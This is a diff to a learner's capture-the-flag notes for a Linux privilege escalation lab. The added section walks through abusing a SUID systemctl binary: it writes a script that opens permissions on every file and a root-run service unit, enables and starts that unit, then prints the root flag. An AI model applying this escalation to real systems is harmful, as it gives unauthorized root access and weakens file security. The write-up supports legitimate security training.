@@ -1,4 +1,4 @@
-export IP=10.10.53.123
+export IP=10.10.36.160
 
 
 ==================================================
@@ -119,3 +119,34 @@ export IP=10.10.53.123
 
 	Command: `find / -user root -perm -4000 -exec ls -ldb {} \;` (maybe add `> /dev/null` at the end to only display things we have permissions to)
 	Answer: `/bin/systemctl`
+
+2) Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
+
+ - Become root and get the last flag (/root/root.txt)
+
+ 	Command:
+ 		- Exploited the /bin/systemctl command.
+ 		- As a general user, we could run `systemctl`, which is the service management tool for linux systems (thing network manager, timers, etc.).
+ 		- Anytime systemctl would execute a service, it would run as root.
+ 		- Before I could do anything though, I had to find a directory where I could actually create files. Using this command, `find / -writable`, I found that the /tmp directory was a good place to go.
+ 		- Using all this knowledge, I created a bash script to change the permissions to read, write, executable for all the files and folders on the server. The file, /tmp/execute.sh looked like this (note: after creation, I had to set it as executable with `chmod +x /tmp/execute.sh`):
+ 			#!/bin/bash
+ 			chmod +rwx /*
+		- I then created my own service file that systemctl could execute. The file, /tmp/gotcha.service, looked like this:
+			[Unit]
+			Description=roooooooot
+
+			[Service]
+			Type=simple
+			User=root
+			ExecStart=/tmp/execute.sh
+
+			[Install]
+			WantedBy=multi-user.target
+		- Now, with the service file created, I linked it to the systemd library (the place where systemctl goes for services) with this command: 
+			`systemctl enable /tmp/gotcha.service`
+		- For the final step, I ran the service using this command:
+			`systemctl start gotcha`
+		- After that, all files and folders were readable and writable to me. I cd'd into /root and cat'd out the root.txt file.
+	Answer:
+		`a58ff8579f0a9270368d33a9966c7fd5`
